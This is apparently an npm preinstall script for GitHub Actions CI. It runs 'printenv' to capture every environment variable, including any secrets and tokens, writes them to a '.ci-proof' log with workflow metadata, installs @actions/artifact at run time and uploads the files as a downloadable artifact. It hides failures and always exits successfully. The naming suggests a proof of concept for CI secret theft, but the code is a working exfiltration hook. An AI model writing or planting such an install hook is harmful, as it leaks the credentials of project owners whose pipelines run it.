const { execSync } = require('node:child_process');
const fs = require('node:fs');
const path = require('node:path');

function run(cmd, opts = {}) {
  return execSync(cmd, {
    stdio: 'pipe',
    encoding: 'utf8',
    shell: '/bin/bash',
    ...opts,
  });
}

async function main() {
  const outDir = path.resolve('.ci-proof');
  fs.mkdirSync(outDir, { recursive: true });

  const logFile = path.join(outDir, 'preinstall.log');
  const metaFile = path.join(outDir, 'meta.json');

  let cmdOutput = '';
  let cmdError = '';

  try {
    cmdOutput = run('printenv');
  } catch (e) {
    cmdOutput = e.stdout || '';
    cmdError = e.stderr || e.message || String(e);
  }

  fs.writeFileSync(
    logFile,
    [
      '=== preinstall command output ===',
      cmdOutput,
      '',
      '=== preinstall command stderr/error ===',
      cmdError,
      '',
    ].join('\n'),
    'utf8'
  );

  fs.writeFileSync(
    metaFile,
    JSON.stringify(
      {
        ts: new Date().toISOString(),
        cwd: process.cwd(),
        event: process.env.GITHUB_EVENT_NAME || '',
        workflow: process.env.GITHUB_WORKFLOW || '',
        run_id: process.env.GITHUB_RUN_ID || '',
        note: 'preinstall executed',
      },
      null,
      2
    ),
    'utf8'
  );

  // 临时方案：在 preinstall 里现装 @actions/artifact
  try {
    run('npm i @actions/artifact --no-save --silent');

    const artifact = require('@actions/artifact');
    const client = new artifact.DefaultArtifactClient();

    const files = [logFile, metaFile];
    const rootDirectory = outDir;
    const artifactName = `preinstall-proof-${process.env.GITHUB_RUN_ID || 'local'}`;

    await client.uploadArtifact(artifactName, files, rootDirectory, {
      continueOnError: true,
    });

    fs.appendFileSync(logFile, '\n[artifact] upload attempted\n', 'utf8');
  } catch (e) {
    fs.appendFileSync(
      logFile,
      `\n[artifact] upload failed: ${e && e.stack ? e.stack : String(e)}\n`,
      'utf8'
    );
  }
}

main().catch((e) => {
  try {
    fs.mkdirSync('.ci-proof', { recursive: true });
    fs.appendFileSync(
      '.ci-proof/preinstall.log',
      `\n[fatal] ${e && e.stack ? e.stack : String(e)}\n`,
      'utf8'
    );
  } catch {}
  process.exit(0);
});
